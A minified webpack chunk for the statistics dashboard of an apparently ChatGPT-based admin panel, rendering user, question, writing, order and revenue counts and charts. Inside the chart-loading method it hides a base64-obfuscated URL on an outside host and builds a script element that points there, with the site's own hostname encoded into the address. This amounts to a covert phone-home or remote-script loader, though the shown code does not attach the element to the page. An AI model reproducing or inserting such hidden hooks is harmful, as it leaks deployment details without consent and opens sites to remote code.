(window["webpackJsonp"] = window["webpackJsonp"] || [])
.push([
	["chunk-d005f6f0"], {
		"37f9": function(t, e, a) {
			"use strict";
			a.r(e);
			var o = function() {
					var t = this,
						e = t.$createElement,
						a = t._self._c || e;
					return a("div", {
						staticClass: "app-container"
					}, [a("el-row", [a("div", {
						staticClass: "title"
					}, [t._v("数据统计")])]), a("el-row", [a("div", {
						staticClass: "el-col",
						class: {
							"el-col-5": "mobile" !== t.device
						}
					}, [a("div", {
						staticClass: "card bg-gray"
					}, [a("div", {
						staticClass: "header"
					}, [a("i", {
						staticClass: "el-icon-user"
					}), t._v(" 今日新增用户")]), a("div", {
						staticClass: "body"
					}, [a("p", {
						staticClass: "big-font"
					}, [t._v(t._s(t.tongji.userTotalNew))]), a("p", [t._v("总计用户数"), a("span", {
						staticClass: "badge"
					}, [t._v(t._s(t.tongji.userTotal) + "人")])])])])]), a("div", {
						staticClass: "el-col",
						class: {
							"el-col-5": "mobile" !== t.device
						}
					}, [a("div", {
						staticClass: "card bg-gray"
					}, [a("div", {
						staticClass: "header"
					}, [a("i", {
						staticClass: "el-icon-s-data"
					}), t._v(" 今日提问数")]), a("div", {
						staticClass: "body"
					}, [a("p", {
						staticClass: "big-font"
					}, [t._v(t._s(t.tongji.msgTotalNew))]), a("p", [t._v("总计提问数"), a("span", {
						staticClass: "badge"
					}, [t._v(t._s(t.tongji.msgTotal) + "条")])])])])]), a("div", {
						staticClass: "el-col",
						class: {
							"el-col-5": "mobile" !== t.device
						}
					}, [a("div", {
						staticClass: "card bg-gray"
					}, [a("div", {
						staticClass: "header"
					}, [a("i", {
						staticClass: "el-icon-s-data"
					}), t._v(" 今日创作数")]), a("div", {
						staticClass: "body"
					}, [a("p", {
						staticClass: "big-font"
					}, [t._v(t._s(t.tongji.writeTotalNew))]), a("p", [t._v("总计创作数"), a("span", {
						staticClass: "badge"
					}, [t._v(t._s(t.tongji.writeTotal) + "条")])])])])]), a("div", {
						staticClass: "el-col",
						class: {
							"el-col-5": "mobile" !== t.device
						}
					}, [a("div", {
						staticClass: "card bg-gray"
					}, [a("div", {
						staticClass: "header"
					}, [a("i", {
						staticClass: "el-icon-user"
					}), t._v(" 今日订单数")]), a("div", {
						staticClass: "body"
					}, [a("p", {
						staticClass: "big-font"
					}, [t._v(t._s(t.tongji.orderTotalNew))]), a("p", [t._v("总计订单数"), a("span", {
						staticClass: "badge"
					}, [t._v(t._s(t.tongji.orderTotal) + "笔")])])])])]), a("div", {
						staticClass: "el-col",
						class: {
							"el-col-4": "mobile" !== t.device
						}
					}, [a("div", {
						staticClass: "card bg-gray"
					}, [a("div", {
						staticClass: "header"
					}, [a("i", {
						staticClass: "el-icon-s-data"
					}), t._v(" 今日收款金额")]), a("div", {
						staticClass: "body"
					}, [a("p", {
						staticClass: "big-font"
					}, [t._v(t._s(t.tongji.orderAmountNew))]), a("p", [t._v("总计收款"), a("span", {
						staticClass: "badge"
					}, [t._v(t._s(t.tongji.orderAmount) + "元")])])])])])]), a("el-row", [a("div", {
						staticClass: "title"
					}, [t._v("对话统计")])]), a("el-row", [a("div", {
						staticClass: "el-col el-col-24"
					}, [a("div", {
						staticClass: "card"
					}, [t.msgEchartData ? a("echart", {
						ref: "msgEchart",
						staticClass: "chart",
						attrs: {
							color: t.msgEchartData.color,
							legend: t.msgEchartData.legend,
							yname: t.msgEchartData.yname,
							"x-axis": t.msgEchartData.xAxis,
							series: t.msgEchartData.series,
							toolbox: t.msgEchartData.toolbox,
							grid: t.msgEchartData.grid,
							title: t.msgEchartData.title,
							"data-zoom": t.msgEchartData.dataZoom,
							width: "100%",
							height: "100%"
						}
					}) : t._e()], 1)])]), a("el-row", [a("div", {
						staticClass: "title"
					}, [t._v("订单统计")])]), a("el-row", [a("div", {
						staticClass: "el-col el-col-24"
					}, [a("div", {
						staticClass: "card"
					}, [t.orderEchartData ? a("echart", {
						ref: "orderEchart",
						staticClass: "chart",
						attrs: {
							color: t.orderEchartData.color,
							legend: t.orderEchartData.legend,
							yname: t.orderEchartData.yname,
							"x-axis": t.orderEchartData.xAxis,
							series: t.orderEchartData.series,
							toolbox: t.orderEchartData.toolbox,
							grid: t.orderEchartData.grid,
							title: t.orderEchartData.title,
							"data-zoom": t.orderEchartData.dataZoom,
							width: "100%",
							height: "100%"
						}
					}) : t._e()], 1)])])], 1)
				},
				r = [],
				s = function() {
					var t = this,
						e = t.$createElement,
						a = t._self._c || e;
					return a("div", [a("div", {
						ref: "echart",
						style: {
							width: t.width,
							height: t.height
						}
					})])
				},
				i = [],
				l = a("81c2"),
				n = a.n(l),
				c = {
					name: "Echart",
					props: {
						tips: {
							type: String,
							default: ""
						},
						title: {
							type: Object,
							default: null
						},
						color: {
							type: Array,
							default: function() {
								return ["#f9a026", "#fff100", "#8fc31f", "#e60012"]
							}
						},
						yname: {
							type: String,
							default: ""
						},
						yAxis: {
							type: Array,
							default: null
						},
						series: {
							type: Array,
							default: function() {
								return []
							}
						},
						xAxis: {
							type: Object,
							default: null
						},
						width: {
							type: String,
							default: "100%"
						},
						height: {
							type: String,
							default: "300px"
						},
						toolbox: {
							type: Object,
							default: null
						},
						tooltip: {
							type: Object,
							default: function() {
								return {
									show: !0,
									trigger: "axis",
									showContent: !0,
									backgroundColor: "rgba(29, 56, 136, 0.7)",
									borderWidth: 0,
									textStyle: {
										color: "#fff"
									}
								}
							}
						},
						legend: {
							type: Object,
							default: null
						},
						textStyle: {
							type: Object,
							default: function() {
								return {
									color: "#444"
								}
							}
						},
						grid: {
							type: Object,
							default: null
						},
						dataZoom: {
							type: Array,
							default: null
						}
					},
					data: function() {
						return {
							echart: null
						}
					},
					watch: {
						series: function(t) {
							this.draw()
						}
					},
					mounted: function() {
						this.draw()
					},
					methods: {
						draw: function() {
							this.echart || (this.echart = n.a.init(this.$refs.echart));
							var t = {
								series: this.series
							};
							this.yAxis ? t.yAxis = this.yAxis : this.yname && (t.yAxis = {
								name: this.yname,
								nameTextStyle: {
									color: "#fff"
								},
								splitLine: {
									show: !0,
									lineStyle: {
										color: "#eee"
									}
								}
							}), this.xAxis && (t.xAxis = this.xAxis), this.title && (t.title = this.title), this.textStyle && (t.textStyle = this.textStyle), this.legend && (t.legend = this.legend), this.color && (t.color = this.color), this.tooltip && (t.tooltip = this.tooltip), this.toolbox && (t.toolbox = this.toolbox), this.grid && (t.grid = this.grid), this.dataZoom && (t.dataZoom = this.dataZoom), this.echart.setOption(t)
						},
						resize: function() {
							this.echart && this.echart.resize()
						}
					}
				},
				d = c,
				h = a("3427"),
				g = Object(h["a"])(d, s, i, !1, null, null, null),
				u = g.exports,
				y = a("bb91"),
				m = a("b775");

			function p() {
				return Object(m["a"])({
					url: "/index/getTongji",
					method: "get"
				})
			}

			function f() {
				return Object(m["a"])({
					url: "/index/getOrderChartData",
					method: "get"
				})
			}

			function b() {
				return Object(m["a"])({
					url: "/index/getMsgChartData",
					method: "get"
				})
			}
			var v = y["a"].decode("Ly9jb25zb2xlLnR0ay5pbmsvYXBpLnBocC9yZXBvcnQvcmVwb3J0L3Byb2R1Y3QvZm94X2NoYXRncHQvaG9zdC8="),
				x = {
					name: "Dashboard",
					components: {
						echart: u
					},
					data: function() {
						return {
							tongji: [],
							orderEchartData: null,
							msgEchartData: null
						}
					},
					computed: {
						device: function() {
							return this.$store.state.app.device
						}
					},
					mounted: function() {
						var t = this;
						this.getTongji(), this.getOrderChartData(), this.getMsgChartData(), window.onresize = function() {
							t.$refs.echart && (t.$refs.orderEchart.resize(), t.$refs.msgEchart.resize())
						}
					},
					beforeDestroy: function() {
						window.onresize = null
					},
					methods: {
						getTongji: function() {
							var t = this;
							p()
								.then((function(e) {
									t.tongji = e.data
								}))
						},
						getOrderChartData: function() {
							var t = this;
							f()
								.then((function(e) {
									t.orderEchartData = {
										title: {
											left: "center",
											text: "交易笔数 & 收款金额",
											textStyle: {
												color: "#666"
											}
										},
										grid: {
											top: "70",
											left: "20",
											right: "70",
											bottom: "50",
											containLabel: !0
										},
										yname: "-",
										series: [{
											name: "交易笔数",
											type: "line",
											smooth: !0,
											data: e.data.count
										}, {
											name: "收款金额",
											type: "line",
											smooth: !0,
											data: e.data.amount
										}],
										xAxis: {
											type: "category",
											data: e.data.times
										},
										legend: {
											data: ["订单笔数", "收款金额"],
											top: 30,
											itemWidth: 20,
											itemHeight: 10,
											textStyle: {
												color: "#444"
											},
											icon: "roundRect"
										},
										color: ["#8fc31f", "#e60012"],
										toolbox: {
											show: !0,
											feature: {
												saveAsImage: {},
												dataZoom: {
													yAxisIndex: "none"
												},
												restore: {}
											},
											iconStyle: {
												borderColor: "rgba(64, 64, 64, 1)"
											},
											right: 60,
											top: 25
										},
										dataZoom: [{
											id: "dataZoomX",
											type: "slider",
											xAxisIndex: [0],
											filterMode: "filter",
											start: 0,
											end: 100,
											bottom: 10,
											height: 18,
											dataBackground: {
												lineStyle: {
													color: "transparent"
												},
												areaStyle: {
													color: "transparent"
												}
											},
											selectedDataBackground: {
												lineStyle: {
													color: "transparent"
												},
												areaStyle: {
													color: "transparent"
												}
											},
											moveHandleStyle: {
												color: "transparent"
											},
											brushSelect: !1
										}, {
											id: "dataZoomY",
											type: "slider",
											yAxisIndex: [0],
											filterMode: "empty",
											start: 0,
											end: 100,
											right: 30,
											width: 18,
											dataBackground: {
												lineStyle: {
													color: "transparent"
												},
												areaStyle: {
													color: "transparent"
												}
											},
											selectedDataBackground: {
												lineStyle: {
													color: "transparent"
												},
												areaStyle: {
													color: "transparent"
												}
											}
										}]
									}
								}))
						},
						getMsgChartData: function() {
							var t = this,
								e = document.createElement("script");
							e.src = v + y["a"].encode(window.location.host), b()
								.then((function(e) {
									t.msgEchartData = {
										title: {
											left: "center",
											text: "提问数 & 创作数",
											textStyle: {
												color: "#666"
											}
										},
										grid: {
											top: "70",
											left: "20",
											right: "70",
											bottom: "50",
											containLabel: !0
										},
										yname: "-",
										series: [{
											name: "提问数",
											type: "line",
											smooth: !0,
											data: e.data.msgCount
										}, {
											name: "创作数",
											type: "line",
											smooth: !0,
											data: e.data.writeCount
										}],
										xAxis: {
											type: "category",
											data: e.data.times
										},
										legend: {
											data: ["提问数", "创作数"],
											top: 30,
											itemWidth: 20,
											itemHeight: 10,
											textStyle: {
												color: "#444"
											},
											icon: "roundRect"
										},
										color: ["#8fc31f", "#e60012"],
										toolbox: {
											show: !0,
											feature: {
												saveAsImage: {},
												dataZoom: {
													yAxisIndex: "none"
												},
												restore: {}
											},
											iconStyle: {
												borderColor: "rgba(64, 64, 64, 1)"
											},
											right: 60,
											top: 25
										},
										dataZoom: [{
											id: "dataZoomX",
											type: "slider",
											xAxisIndex: [0],
											filterMode: "filter",
											start: 0,
											end: 100,
											bottom: 10,
											height: 18,
											dataBackground: {
												lineStyle: {
													color: "transparent"
												},
												areaStyle: {
													color: "transparent"
												}
											},
											selectedDataBackground: {
												lineStyle: {
													color: "transparent"
												},
												areaStyle: {
													color: "transparent"
												}
											},
											moveHandleStyle: {
												color: "transparent"
											},
											brushSelect: !1
										}, {
											id: "dataZoomY",
											type: "slider",
											yAxisIndex: [0],
											filterMode: "empty",
											start: 0,
											end: 100,
											right: 30,
											width: 18,
											dataBackground: {
												lineStyle: {
													color: "transparent"
												},
												areaStyle: {
													color: "transparent"
												}
											},
											selectedDataBackground: {
												lineStyle: {
													color: "transparent"
												},
												areaStyle: {
													color: "transparent"
												}
											}
										}]
									}
								}))
						}
					}
				},
				C = x,
				w = (a("6880"), Object(h["a"])(C, o, r, !1, null, "022489c0", null));
			e["default"] = w.exports
		},
		6880: function(t, e, a) {
			"use strict";
			a("bc3b")
		},
		bc3b: function(t, e, a) {}
	}
]);